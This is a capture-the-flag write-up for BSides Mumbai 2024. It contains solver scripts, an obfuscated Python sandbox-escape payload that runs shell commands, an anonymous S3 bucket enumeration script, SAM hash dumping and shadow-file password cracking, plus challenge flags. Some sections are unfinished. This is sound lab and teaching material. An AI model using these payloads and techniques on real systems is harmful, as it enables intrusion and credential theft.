### User : k0m1

### Sanity Check
-  Flag can be found in the discord server itself in the Rules and ctf-general channel
![Screenshot_from_2024-05-19_19-51-46](https://hackmd.io/_uploads/HkbBQAvQA.png)
![Screenshot_from_2024-05-19_19-51-59](https://hackmd.io/_uploads/BJ1LmRv7A.png)


### Welcome

Solution
- From the page source of the ctf website we a zip file
![image2](https://hackmd.io/_uploads/BJRrshvXA.png)
- Upon downloading it we got the flags in two jpegs, left part and right part.
![image4](https://hackmd.io/_uploads/SJXvj2PQA.png)
![image3](https://hackmd.io/_uploads/SkMDs3v7A.png)


### Common

Solution
The description  mentioned to login using default credentials .
Going to https://ctf.bsidesmumbai.in/login with creds  ``` admin:admin ``` revealed an account with email ```admin1@bsidesmumbai.in``` .Finally got the flag under  Access Tokens>Usage Description in https://ctf.bsidesmumbai.in/settings 

Flag :
```
BSMumbai{y0u_g0t_th!s_d@mn_ea5y}
```

### Vadapaooo

- Fixing the vadapaooo file by adding the jpeg signature headers FF D8 FF E0 00 10 4A 46 49 46 00 01 to get the jpeg image.
![vadapaoooo](https://hackmd.io/_uploads/HycZ0aP7C.jpg)
- By using the tool stegracker I bruteforced for the hash and extracted the file out of it which had the flag.
- Password : `Pa$$w0rd`
- Flag : `BSMumbai{MeIn_V@d@_p@V_kHal0}`

### Baby Pass

- In the URL of the challenge I changed the URL to /fLAg and bypassed the 403 and got the flag

Flag : ```BSMumbai{WOAH_WHY_HOW}```



### Lottery

Solution: 
- Initally send any negative number for infinite chances
- Try all possible combinations of 1 to 5 , in which one of them will be successful and provides the flag

Solver Script
```python
from pwn import *
from icecream import ic
import itertools

context.log_level = "debug"

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return remote("143.110.176.49",1024)


def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

ru(b'were:')

a = rl().decode().strip().split(' ')

ic(a)

sl("-1")

def generate_combinations():
    for combo in itertools.product('12345', repeat=5):
        yield ' '.join(combo)

for combination in generate_combinations():
    sl(combination.encode())
    response = rl()
    if 'BSMumbai' in response.decode().strip():
        ic(response.decode().strip())
        ic(combination)
        break

r.interactive()
```

Screenshot
![Screenshot from 2024-05-19 20-52-01](https://hackmd.io/_uploads/B1wmtqDmA.png)

Flag : `BSMumbai{l0tt0_tick3tingss}`


### Rabbit Holes

- Analysing the memory dump using Volatility 3, and looking at `windows.pstree.PsTree`, we could see a process running via `StikyNot.exe`

```
﻿
 ./vol.py -f ../downloads/"Copy of rabbithole.mem" windows.pstree.PsTree
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished                        
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	Audit	Cmd	Path

4	0	System	0xfa8005dce040	96	497	N/A	False	2024-05-17 06:05:50.000000 	N/A	-	-	-
* 260	4	smss.exe	0xfa8007032b00	2	32	N/A	False	2024-05-17 06:05:50.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\smss.exe	\SystemRoot\System32\smss.exe	\SystemRoot\System32\smss.exe
340	324	csrss.exe	0xfa8008b30060	9	368	0	False	2024-05-17 06:05:50.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16	C:\Windows\system32\csrss.exe
384	324	wininit.exe	0xfa8008c13060	3	83	0	False	2024-05-17 06:05:50.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\wininit.exe	wininit.exe	C:\Windows\system32\wininit.exe
* 516	384	lsm.exe	0xfa8008d93b00	10	150	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\lsm.exe	C:\Windows\system32\lsm.exe	C:\Windows\system32\lsm.exe
* 460	384	services.exe	0xfa8008d27b00	8	201	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\services.exe	C:\Windows\system32\services.exe	C:\Windows\system32\services.exe
** 832	460	svchost.exe	0xfa8008e72360	20	464	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted	C:\Windows\System32\svchost.exe
*** 1020	832	audiodg.exe	0xfa8008ee7b00	5	129	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\audiodg.exe	C:\Windows\system32\AUDIODG.EXE 0x2c4	C:\Windows\system32\AUDIODG.EXE
** 2404	460	taskhost.exe	0xfa800634e240	10	169	0	False	2024-05-17 06:09:54.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\taskhost.exe	taskhost.exe $(Arg0)	C:\Windows\system32\taskhost.exe
** 616	460	svchost.exe	0xfa8008e118e0	10	371	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch	C:\Windows\system32\svchost.exe
*** 1552	616	WmiPrvSE.exe	0xfa80064c7b00	9	121	0	False	2024-05-17 06:09:54.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\wbem\WmiPrvSE.exe	C:\Windows\system32\wbem\wmiprvse.exe	C:\Windows\system32\wbem\wmiprvse.exe
** 872	460	svchost.exe	0xfa8008e9d060	19	451	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted	C:\Windows\System32\svchost.exe
*** 1340	872	dwm.exe	0xfa800904bb00	3	93	1	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\dwm.exe	"C:\Windows\system32\Dwm.exe"	C:\Windows\system32\Dwm.exe
** 680	460	VBoxService.ex	0xfa8008dd23d0	13	120	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\VBoxService.exe	C:\Windows\System32\VBoxService.exe	C:\Windows\System32\VBoxService.exe
** 748	460	svchost.exe	0xfa8008e27b00	7	286	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k RPCSS	C:\Windows\system32\svchost.exe
** 908	460	svchost.exe	0xfa8008ea6b00	13	341	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalService	C:\Windows\system32\svchost.exe
** 1452	460	svchost.exe	0xfa80090dd060	10	153	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k utcsvc	C:\Windows\System32\svchost.exe
** 944	460	svchost.exe	0xfa8008ec08b0	33	972	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs	C:\Windows\system32\svchost.exe
** 2872	460	svchost.exe	0xfa8008d71710	13	352	0	False	2024-05-17 06:07:55.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k secsvcs	C:\Windows\System32\svchost.exe
** 1244	460	taskhost.exe	0xfa8009015b00	10	233	1	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\taskhost.exe	"taskhost.exe"	C:\Windows\system32\taskhost.exe
** 2068	460	SearchIndexer.	0xfa800931bb00	12	706	0	False	2024-05-17 06:05:53.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\SearchIndexer.exe	C:\Windows\system32\SearchIndexer.exe /Embedding	C:\Windows\system32\SearchIndexer.exe
*** 2248	2068	SearchProtocol	0xfa80093ccb00	8	359	0	False	2024-05-17 06:05:54.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\SearchProtocolHost.exe	"C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe2_ Global\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" 	C:\Windows\system32\SearchProtocolHost.exe
*** 4092	2068	SearchFilterHo	0xfa8006349b00	7	136	0	False	2024-05-17 06:08:56.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\SearchFilterHost.ex"C:\Windows\system32\SearchFilterHost.exe" 0 520 524 532 65536 528 	C:\Windows\system32\SearchFilterHost.exe
** 2836	460	sppsvc.exe	0xfa8009391b00	4	147	0	False	2024-05-17 06:07:55.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\sppsvc.exe	C:\Windows\system32\sppsvc.exe	C:\Windows\system32\sppsvc.exe
** 344	460	svchost.exe	0xfa8008f6c640	16	465	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k NetworkService	C:\Windows\system32\svchost.exe
** 1148	460	spoolsv.exe	0xfa8008ec2b00	13	309	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\spoolsv.exe	C:\Windows\System32\spoolsv.exe	C:\Windows\System32\spoolsv.exe
** 1208	460	svchost.exe	0xfa8009000060	17	328	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork	C:\Windows\system32\svchost.exe
* 508	384	lsass.exe	0xfa8008d918e0	8	664	0	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\lsass.exe	C:\Windows\system32\lsass.exe	C:\Windows\system32\lsass.exe
404	392	csrss.exe	0xfa8008ca09e0	13	551	1	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16	C:\Windows\system32\csrss.exe
480	392	winlogon.exe	0xfa8008d2b940	3	118	1	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\winlogon.exe	winlogon.exeC:\Windows\system32\winlogon.exe
1364	1320	explorer.exe	0xfa800907e240	28	805	1	False	2024-05-17 06:05:51.000000 	N/A	\Device\HarddiskVolume1\Windows\explorer.exe	C:\Windows\Explorer.EXE	C:\Windows\Explorer.EXE
* 2104	1364	FTK Imager.exe	0xfa80070106e0	21	348	1	False	2024-05-17 06:08:25.000000 	N/A	\Device\HarddiskVolume1\Program Files\AccessData\FTK Imager\FTK Imager.exe	"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" 	C:\Program Files\AccessData\FTK Imager\FTK Imager.exe
* 3300	1364	iexplore.exe	0xfa8006194850	11	507	1	False	2024-05-17 06:08:28.000000 	N/A	\Device\HarddiskVolume1\Program Files\Internet Explorer\iexplore.exe"C:\Program Files\Internet Explorer\iexplore.exe" 	C:\Program Files\Internet Explorer\iexplore.exe
** 3984	3300	iexplore.exe	0xfa8006112060	18	457	1	True	2024-05-17 06:08:55.000000 	N/A	\Device\HarddiskVolume1\Program Files (x86)\Internet Explorer\iexplore.exe	"C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:3300 CREDAT:3675404 /prefetch:2	C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
** 3356	3300	iexplore.exe	0xfa80061c6b00	26	553	1	True	2024-05-17 06:08:28.000000 	N/A	\Device\HarddiskVolume1\Program Files (x86)\Internet Explorer\iexplore.exe	"C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:3300 CREDAT:267521 /prefetch:2	C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
* 1740	1364	VBoxTray.exe	0xfa8009115060	13	147	1	False	2024-05-17 06:05:52.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\VBoxTray.exe	"C:\Windows\System32\VBoxTray.exe" 	C:\Windows\System32\VBoxTray.exe
* 1820	1364	StikyNot.exe	0xfa80092d91e0	8	141	1	False	2024-05-17 06:05:52.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\StikyNot.exe	"C:\Windows\System32\StikyNot.exe" 	C:\Windows\System32\StikyNot.exe
2536	2424	firefox.exe	0xfa80096fd2c0	81	1123	1	False	2024-05-17 06:08:26.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe"	C:\Program Files\Mozilla Firefox\firefox.exe
* 1472	2536	firefox.exe	0xfa8005f1fb00	23	271	1	False	2024-05-17 06:08:27.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.3.1830051238\1622906599" -childID 2 -isForBrowser -prefsHandle 2760 -prefMapHandle 2756 -prefsLen 34496 -prefMapSize 243164 -jsInitHandle 912 -jsInitLen 240916 -parentBuildID 20240506144012 -appDir "C:\Program Files\Mozilla Firefox\browser" - {453b607b-1da9-4d3c-9c82-3b15f855d385} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 2772 tab	C:\Program Files\Mozilla Firefox\firefox.exe
* 2432	2536	firefox.exe	0xfa8006149b00	19	244	1	False	2024-05-17 06:08:28.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.5.1136407536\514130094" -childID 4 -isForBrowser -prefsHandle 4012 -prefMapHandle 4016 -prefsLen 29217 -prefMapSize 243164 -jsInitHandle 912 -jsInitLen 240916 -parentBuildID 20240506144012 -appDir "C:\Program Files\Mozilla Firefox\browser" - {9abfb904-2f89-4a20-8377-b059fe2023ef} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 4000 tab	C:\Program Files\Mozilla Firefox\firefox.exe
* 1476	2536	firefox.exe	0xfa800601db00	24	276	1	False	2024-05-17 06:08:27.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.2.504567015\981300913" -childID 1 -isForBrowser -prefsHandle 2000 -prefMapHandle 2056 -prefsLen 29035 -prefMapSize 243164 -jsInitHandle 912 -jsInitLen 240916 -parentBuildID 20240506144012 -appDir "C:\Program Files\Mozilla Firefox\browser" - {7ccc5e06-04b1-457d-a7d4-2c2d12829993} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 2036 tab	C:\Program Files\Mozilla Firefox\firefox.exe
* 3876	2536	firefox.exe	0xfa80061d7b00	22	248	1	False	2024-05-17 06:08:53.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.7.1301862333\358423530" -childID 6 -isForBrowser -prefsHandle 3340 -prefMapHandle 1660 -prefsLen 29361 -prefMapSize 243164 -jsInitHandle 912 -jsInitLen 240916 -parentBuildID 20240506144012 -appDir "C:\Program Files\Mozilla Firefox\browser" - {0527ec85-540b-4f65-908b-481e09b4ab0e} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 3368 tab	C:\Program Files\Mozilla Firefox\firefox.exe
* 1672	2536	firefox.exe	0xfa8005fa2b00	28	312	1	False	2024-05-17 06:08:27.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.0.455805309\707337902" -parentBuildID 20240506144012 -prefsHandle 1112 -prefMapHandle 1104 -prefsLen 28835 -prefMapSize 243164 -appDir "C:\Program Files\Mozilla Firefox\browser" - {e0c4e97c-ca4a-4b8e-8d4a-c159261f3a8c} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 1196 gpu	C:\Program Files\Mozilla Firefox\firefox.exe
* 2060	2536	firefox.exe	0xfa800614fb00	19	244	1	False	2024-05-17 06:08:28.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.6.731376104\729297377" -childID 5 -isForBrowser -prefsHandle 3924 -prefMapHandle 4160 -prefsLen 29217 -prefMapSize 243164 -jsInitHandle 912 -jsInitLen 240916 -parentBuildID 20240506144012 -appDir "C:\Program Files\Mozilla Firefox\browser" - {1215d4bf-a2e0-4793-b608-c04b52b7edbb} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 4260 tab	C:\Program Files\Mozilla Firefox\firefox.exe
* 1488	2536	firefox.exe	0xfa8006026b00	24	270	1	False	2024-05-17 06:08:28.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.4.1175317993\1339288351" -childID 3 -isForBrowser -prefsHandle 3880 -prefMapHandle 3876 -prefsLen 29217 -prefMapSize 243164 -jsInitHandle 912 -jsInitLen 240916 -parentBuildID 20240506144012 -appDir "C:\Program Files\Mozilla Firefox\browser" - {ea188312-122f-4f31-b973-6b2bd6fe5ede} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 3896 tab	C:\Program Files\Mozilla Firefox\firefox.exe
* 1276	2536	firefox.exe	0xfa800601fb00	8	152	1	False	2024-05-17 06:08:27.000000 	N/A	\Device\HarddiskVolume1\Program Files\Mozilla Firefox\firefox.exe	"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel="2536.1.18178414\829027950" -parentBuildID 20240506144012 -prefsHandle 1428 -prefMapHandle 1424 -prefsLen 28880 -prefMapSize 243164 -appDir "C:\Program Files\Mozilla Firefox\browser" - {891eaa8e-1c3d-4054-9a3d-264250fef327} 2536 "\\.\pipe\gecko-crash-server-pipe.2536" 1440 socket	C:\Program Files\Mozilla Firefox\firefox.exe
```
```bash
* 1820	1364	StikyNot.exe	0xfa80092d91e0	8	141	1	False	2024-05-17 06:05:52.000000 	N/A	\Device\HarddiskVolume1\Windows\System32\StikyNot.exe	"C:\Windows\System32\StikyNot.exe" 	C:\Windows\System32\StikyNot.exe
```
- On Dumping the files using `windows.dumpfiles.DumpFiles`,
![Screenshot from 2024-05-19 21-15-03](https://hackmd.io/_uploads/rJwG6aPmR.png)




- Checking strings of the file, gives us the flag

![Screenshot from 2024-05-19 21-21-30](https://hackmd.io/_uploads/BJeGlowXA.png)

Flag : `BSidesMumbai{1n_pla1n_s1ght}`





### Potential APT

Solution

- Upon inspecting the given zip file , we see that we are given a SAM file as well as a SYSTEM file
- So I used the impacket-secretsdump to dump the SAM hashes
![image](https://hackmd.io/_uploads/Hkptd2vmC.png)

- After getting the hashes i used john to retrieve the passowrds
![image](https://hackmd.io/_uploads/HyZCO2w7C.png)

- This gave me the password of the littlemermaid user which is "Password1"

Flag : `BSidesMumbai{Password1}`




### Mobile Game with Backdoor

-  Based on the description, it is understood that this is a modded APK. 
-  Idea is to find the difference between the original and Modded APK. 
-  Original APK : [Link](https://www.apkmirror.com/apk/gears-studios/flappy-bird/flappy-bird-1-3-release/flappy-bird-1-3-android-apk-download/?redirected=thank_you_invalid_nonce)
-  Using [apkcompare](https://github.com/saitamasahil/APK-Compare-Tool), compared both the files. 
-  We could notice, a new service named **z** is added in the modded apk and also in `res/values/strings.xml`, a new key named `aes_key` with value `usnPn5Ofvobb7WNwBikZruJGEAZOs8Zd` is added. 
-  Looking at `com.dotgears.flappy.z`, we could see value `UHaV02kBvLFnivYDPwGaP2w4KzuLtxN0yVLGPgI0XuL1EP3iCRF/lM2trm+JKNhT0A6i7BfrmByZZ7nqFanZjQ` getting exfiltrated to `https://5fec-103-93-192-228.ngrok-free.app/exfiltrate` as per the challenge. 
-  We could also notice that in `res/values/strings.xml`, we could see key `IV_Key` without proper iv key
-  Now I thought of searching for `AES` in the application, thats when i came across
```java 
public static byte[] a(byte[] bArr, String str) {
        if (bArr.length != 16) {
            throw new an();
        }
        try {
            byte[] a = aq.a(str);
            if (a.length <= 16) {
                throw new an();
            }
            ByteBuffer allocate = ByteBuffer.allocate(a.length);
            allocate.put(a);
            allocate.flip();
            byte[] bArr2 = new byte[16];
            byte[] bArr3 = new byte[a.length - 16];
            allocate.get(bArr2);
            allocate.get(bArr3);
            SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(2, secretKeySpec, new IvParameterSpec(bArr2));
            return cipher.doFinal(bArr3);
        } catch (InvalidAlgorithmParameterException e) {
            throw new an(e);
        } catch (InvalidKeyException e2) {
            throw new an(e2);
        } catch (NoSuchAlgorithmException e3) {
            throw new an(e3);
        } catch (BadPaddingException e4) {
            throw new an(e4);
        } catch (IllegalBlockSizeException e5) {
            throw new an(e5);
        } catch (NoSuchPaddingException e6) {
            throw new an(e6);
        }
    }
```
- Looking at this says that 
    - Both IV and Encrypted text is a part of the exfiltrated data, where IV is the first 16 bytes and encrypted text is remaining bytes.
    - AES Key is getting manipulated at `aq.a()`.
- Emulating all the required code in our system, gives us a Base64 string : `dF9VczNfTTBEX0E5S30`
- Decoding it gives us : `t_Us3_M0D_A9K}`
- Since we know the flag format is `BSMumbai{` , we get the flag as `BSMumbai{D0nt_Us3_M0D_A9K}`


### Conundrum

Solution
- We are given an apk file which has a login page to bypass and upon logging in we are taken to the Landing Page
- This is an unintended solution. 
- We can directly land at Landing page by modifying `exported="false"` to true and repatching the application.
- We can load Landing Activity via adb -> `adb shell am start -n com.logintest/.Landing_Page`.
- Flag will be present on the UI
- ![Screenshot from 2024-05-19 22-48-02](https://hackmd.io/_uploads/ryXi53vXR.png)

Flag : `BSMumbai{LoG!n_ByP@$$eD}`

### Find-Me

Solution

- We are given a pcapng file. Upon opening it in wireshark we see a lot of requests to the \*.cloudfront.com with multiple random subdomains
- Initially I thought that the subdomains if , concatenated and base64 decoded would give the flag. Unfortunately it didnt work.
-  In the final 30 minutes of the ctf , the author released a pop hint along the lines of how DNS can whisper .
- Upon searching for 'packetwhisper in pcap' I came across a github repo describing the DNS exfiltration technique. 
- ```What if data could be transferred using the target's own whitelisted DNS servers, without the communicating systems ever directly connecting to each other or to a common endpoint```. Cue **PacketWhisper** https://github.com/TryCatchHCF/PacketWhisper
- It combines DNS queries with text-based steganography.
- Using ```packetWhisper.py``` is extracted the flag from the pcapng file
- I gave the following options while doing so

```
What OS are you currently running on?

1) Linux/Unix/MacOS
2) Windows

Select OS [1 or 2]: 1

1) Random Subdomain FQDNs  (example: d1z2mqljlzjs58.cloudfront.net)
2) Unique Repeating FQDNs  (example: John.Whorfin.yoyodyne.com)
3) [DISABLED] Common Website FQDNs    (example: www.youtube.com)

Selection: 1

Ciphers:

1 - akstat_io_prefixes
2 - cdn_optimizely_prefixes
3 - cloudfront_prefixes
4 - log_optimizely_prefixes

Enter cipher #: 3

Extracting payload from PCAP using cipher: ciphers/subdomain_randomizer_scripts/cloudfront_prefixes

Save decloaked data to filename (default: 'decloaked.file'): 

File 'cloaked.payload' decloaked and saved to 'decloaked.file'

```

Flag : ```BSMumbai{p4ck3ts_a1n7_wh1sp3ring}```

### ManyDoc

Solution
- We change the extension of the .docx files to .zip and Extract them
- In one of the folders, there is a binary file along with a number of xml files. 
- When we run strings on the binary file, we get a Base64 encoded string, which when decoded gives the flag.
![Screenshot from 2024-05-19 23-30-44](https://hackmd.io/_uploads/HkywCnw7C.png)
- Flag : `BSidesMumbai{m4ld0c_r3v1s3d}`


### Jail Shell

Solution
-  Found a similar challenge ([Link](https://technicalnavigator.in/python-jail-escape-a-horse-with-no-names-ctf-challenge/))
- This is a classic jail breaking chall. Upon looking into the chall we can see that there are certain restrictions in passing input.

```python=

if re.match(r"[a-zA-Z]{4}", code):
    print("Code failed, restarting...")
    
```

- The regex `[a-zA-Z]{4}` is checking whether a 4 chars long string is there in starting without any symbols or numbers in the input

- We can easily bypass this by adding a non alphabetic character in the beginning

```python=
code = '2winner'
discovery = list(eval(compile(code, "<code>", "eval").replace(co_names=())))
Traceback (most recent call last):
  File "<pyshell#1>", line 1, in <module>
    discovery = list(eval(compile(code, "<code>", "eval").replace(co_names=())))
  File "<code>", line 1
    2winner
    ^
SyntaxError: invalid decimal literal
```

- Then we have to bypass this

```python=
elif len(set(re.findall(r"[\W]", code))) > 4:
    print(set(re.findall(r"[\W]", code)))
    print("A single code cannot process this much special characters. Restarting.")
```

- We can do this by using builtin functions

```
Let's Start: (lambda: __builtins__.__import__("os").system("whoami"))()
{' ', ':', ')', '/', '(', '.', '"'}
A single code cannot process this much special characters. Restarting.

```

- Since we want to read the flag , we need to make a script , so make the following script

```python=
def payload_creator(cmd):
    mapping = {
        'o': "open.__name__.__getitem__(0)",
        's': "set.__name__.__getitem__(0)",
        'c': "chr.__name__.__getitem__(0)",
        'h': "hash.__name__.__getitem__(0)",
        'e': "eval.__name__.__getitem__(0)",
        'a': "abs.__name__.__getitem__(0)",
        'd': "divmod.__name__.__getitem__(0)",
        'f': "float.__name__.__getitem__(0)",
        'l': "list.__name__.__getitem__(0)",
        'g': "globals.__name__.__getitem__(0)",
        't': "type.__name__.__getitem__(0)",
        'x': "hex.__name__.__getitem__(2)",
        ' ': "str(hash).__getitem__(9)",
        '-': "str(hash).__getitem__(6)",
        '.': "hash.__doc__.__getitem__(151)",
        '1': "dict.__doc__.__getitem__(361)",
        '/': "divmod.__doc__.__getitem__(20)",
        'b': "abs.__name__.__getitem__(1)",
        'i': "list.__name__.__getitem__(1)"
        
    }
    for k,v in mapping.items():
        assert(k == eval(v))
    
    payload=''
    for ch in cmd:
        encoded_ch = mapping[ch]
        if len(payload) == 0:
            payload = encoded_ch
        else:
            payload += f".__add__({encoded_ch})"
    assert(eval(payload) == cmd)
    return payload

final_payload = f"(lambda:__builtins__.__import__({payload_creator('os')}).system({payload_creator('cat ./flag.txt')}))()"
print(final_payload) 
```

- This generates us the following payload

```
(lambda:__builtins__.__import__(open.__name__.__getitem__(0).__add__(set.__name__.__getitem__(0))).system(chr.__name__.__getitem__(0).__add__(abs.__name__.__getitem__(0)).__add__(type.__name__.__getitem__(0)).__add__(str(hash).__getitem__(9)).__add__(hash.__doc__.__getitem__(151)).__add__(divmod.__doc__.__getitem__(20)).__add__(float.__name__.__getitem__(0)).__add__(list.__name__.__getitem__(0)).__add__(abs.__name__.__getitem__(0)).__add__(globals.__name__.__getitem__(0)).__add__(hash.__doc__.__getitem__(151)).__add__(type.__name__.__getitem__(0)).__add__(hex.__name__.__getitem__(2)).__add__(type.__name__.__getitem__(0))))()
```

Flag : ```BSMumbai{J4i1_sh5ll_f0r_FuN}```


### A bucket load of Samosa!

-  Open the link given in the challenge 
-  Save all the bucket names in a text file so that it can be automated.
-  Make a python script to automate the process of checking which bucket's contents can be viewed by public


```python
import subprocess

def check(filename):
    with open(filename, 'r') as file:
        bucket = [line.strip() for line in file.readlines()]

    for name in bucket:
        command = f"aws s3 ls s3://{name}.naughtyide --no-sign-request"
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
            if result.returncode == 0:
                print(f"Bucket {name}:")
                print(result.stdout)
        except subprocess.CalledProcessError as e:
            if "NoSuchBucket" in e.stderr:
                print(f"Bucket {name} does not exist.")
            elif "AccessDenied" in e.stderr:
                print(f"Access denied to bucket {name}.")
            else:
                print(f"Error checking bucket {name}: {e.stderr}")

if __name__ == "__main__":
    filename = 'names.txt'  
    check(filename)
```

-  We can see the content of social.naughtyide, i.e COM which is a directory
-  We see what is in the directory using the command:

> aws s3 ls s3://social.naughtyide/COM/ --no-sign-request

-  We see that it has flag.txt
-  We use the following command to download the flag on our machine

> aws s3 cp s3://social.naughtyide/COM/flag.txt ./ --recursive --no-sign-request
- Open the flag.txt in the working directory, where is has been downloaded to get the flag
- Flag : `BMCTF{Buried_Inside_Buckets}`

### Data Breach

- We are given a zip file , upon unzipping , we get another zip file called Confidentil_Document.zip. Upon trying to extract that we get the following error

![Screenshot from 2024-05-20 00-16-29](https://hackmd.io/_uploads/S1GPF6PmR.png)

![Screenshot from 2024-05-20 00-18-52](https://hackmd.io/_uploads/HJZoFpvXA.png)

### AMI Not Worthy? A story of Baburao

-  GO to AWS Management Console
-  Set the zone to Frankfurt (eu-central-1)
-  Go to EC2 section
-  Select AMI and search for public AMI named Baburao
-  Create a new EC2 instance from this AMI
-  Connect to the new EC2 instance
-  Use the following command to find flag.txt

> sudo find / -type f -iname "*flag*.txt" 2>/dev/null


Flag : ```BMCTF{G00D_F!nD_Dud3}```


### Shadow Realm

- We are given a zip file which contains a passwd file as well as shdow file
- So we run this following commands to crack the password present in the shadow file 

> unshadow passwd shadow > hashes.txt

> john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hashes.txt

- This returns us the password as "Spongebob" for the bsidesmumbai user

![image](https://hackmd.io/_uploads/B13MyRDQ0.png)

Flag : ```BSMumbai{spongebob}```

### Foxed

